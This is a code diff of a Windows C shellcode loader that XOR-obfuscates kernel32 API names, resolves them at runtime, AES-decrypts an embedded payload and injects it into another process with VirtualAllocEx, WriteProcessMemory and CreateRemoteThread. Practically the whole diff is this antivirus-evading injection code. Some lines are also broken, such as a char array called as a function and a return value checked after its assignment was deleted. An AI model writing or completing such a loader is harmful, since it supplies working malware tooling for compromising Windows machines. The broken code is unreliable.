@@ -8,6 +8,12 @@
 #include <psapi.h>
 #include <tlhelp32.h>
 
+
+char key[] = "GetNewVersionNumber";
+
+char AESkey[] = { 0x2a, 0xdb, 0x65, 0xc1, 0xad, 0x5e, 0xa0, 0xed, 0x53, 0x8a, 0x15, 0x63, 0x47, 0x8b, 0x82, 0x22 };
+
+
 int FindTarget(const char * procname){
 	HANDLE hProcSnap;
 	PROCESSENTRY32 pe32;
@@ -44,38 +50,40 @@ HANDLE (WINAPI * poPen) (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwPro
 DWORD (WINAPI * pwFSO) (HANDLE hHandle, DWORD dwMilliseconds);
 
 // WriteProcessMemory
-BOOL (WINAPI * pProcmem) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+BOOL (WINAPI * pwProcmem) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
 
 // CreateRemoteThread
-HANDLE (WINAPI * pCreateRThread) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParamter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+HANDLE (WINAPI * prthreadA) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParamter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 
-int inject(HANDLE hProc, unsigned char * payload, unsigned int lengthyBoi){
+int Inject(HANDLE hProc, unsigned char * payload, unsigned int lengthyBoi){
 	LPVOID pRemoteCode = NULL;
 	HANDLE hThread = NULL;
 
-	char wFSO[] = {0x10,0x04,0x1d,0x3a,0x23,0x18,0x24,0x36,0x1b,0x1d,0x0e,0x03,0x0b,0x01,0x17,0x07,0x07,0x06,0x06};
-	XOR((char *) wFSO, sizeof(wFSO), key, strlen(key));	
-	
 	char unAllocex[] = { 0x11, 0xc, 0x6, 0x3a, 0x10, 0x16, 0x3a, 0x24, 0x1e, 0x1f, 0x6, 0xc, 0x2b, 0x36 };
 	XOR((char *) unAllocex, sizeof(unAllocex), key, strlen(key));
 
 	char oPen[] = { 0x8, 0x15, 0x11, 0x20, 0x35, 0x5, 0x39, 0x6, 0x17, 0x0, 0x1a };
 	XOR((char *) oPen, sizeof(oPen), key, strlen(key));
 
+	char wFSO[] = {0x10,0x04,0x1d,0x3a,0x23,0x18,0x24,0x36,0x1b,0x1d,0x0e,0x03,0x0b,0x01,0x17,0x07,0x07,0x06,0x06};
+	XOR((char *) wFSO, sizeof(wFSO), key, strlen(key));	
+
 	char wProcmem[] = {0x10, 0x17, 0x1d, 0x3a, 0x0, 0x27, 0x24, 0xa, 0x11, 0x16, 0x1a, 0x1c, 0x23, 0x2b, 0x18, 0x2, 0x10, 0x1c};
 	XOR((char *) wProcmem, sizeof(wProcmem), key, strlen(key));
 
 	char rthreadA[] = {0x4, 0x17, 0x11, 0x2f, 0x11, 0x12, 0x4, 0x0, 0x1f, 0x1c, 0x1d, 0xa, 0x3a, 0x26, 0x7, 0x8, 0x3, 0x1 };
-	XOR((char *) threadA, sizeof(threadA), key, strlen(key));
+	XOR((char *) rthreadA, sizeof(rthreadA), key, strlen(key));
 
-	pthreadA = GetProcAddress(GetModuleHandle("kernel32.dll"), rthreadA);
+	pAllocex = GetProcAddress(GetModuleHandle("kernel32.dll"), unAllocex);
+	poPen = GetProcAddress(GetModuleHandle("kernel32.dll"), oPen);
+	prthreadA = GetProcAddress(GetModuleHandle("kernel32.dll"), rthreadA);
 	pwFSO = GetProcAddress(GetModuleHandle("kernel32.dll"), wFSO);
-
+	pwProcmem = GetProcAddress(GetModuleHandle("kernel32.dll"), wProcmem);
 
 	pRemoteCode = pAllocex(hProc, NULL, lengthyBoi, MEM_COMMIT, PAGE_EXECUTE_READ);
-	wProcmem(hProc, NULL, 0 , pRemoteCode, NULL, 0, NULL);
+	wProcmem(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)lengthyBoi, (SIZE_T *)NULL);
 
-	hThread = rthreadA(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+	hThread = prthreadA(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 	if(hThread != NULL){
 		pwFSO(hThread, 500);
 		CloseHandle(hThread);
@@ -132,25 +140,12 @@ int main(void) {
 
 	unsigned int lengthyBoi = sizeof(payload);
 
-	char key[] = "GetNewVersionNumber";
-	
-	char AESkey[] = { 0x2a, 0xdb, 0x65, 0xc1, 0xad, 0x5e, 0xa0, 0xed, 0x53, 0x8a, 0x15, 0x63, 0x47, 0x8b, 0x82, 0x22 };
 
 
-
-
-
-
-
-	
 	AESDecrypt((char *) payload, lengthyBoi, AESkey, sizeof(AESkey));
 
-	pmvMe(exec_mem, payload, lengthyBoi);
-
-	rv = pProtect(exec_mem, lengthyBoi, PAGE_EXECUTE_READ, &oldprotect);
-
 	if (rv != 0){
-		th = rthreadA(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+		th = prthreadA(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 		pwFSO(th, -1);
 	}
 
@@ -166,8 +161,6 @@ int main(void) {
 			CloseHandle(hProc);
 		}
 	}
-
-
 
 	return 0;
 }
